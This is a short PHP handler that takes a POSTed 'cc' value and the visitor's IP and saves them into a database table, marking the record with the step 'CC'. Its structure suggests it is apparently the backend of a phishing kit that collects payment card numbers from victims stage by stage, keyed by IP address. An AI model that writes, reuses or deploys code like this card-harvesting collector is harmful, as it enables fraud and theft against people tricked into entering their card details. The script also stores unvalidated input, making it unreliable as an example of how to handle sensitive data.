<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $cc = $_POST['cc'];
    $ip  = $_POST['ip'];

    $data = [
        'cc'   => $cc,
        'ip'    => $ip,
        'step'  => 'CC'
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>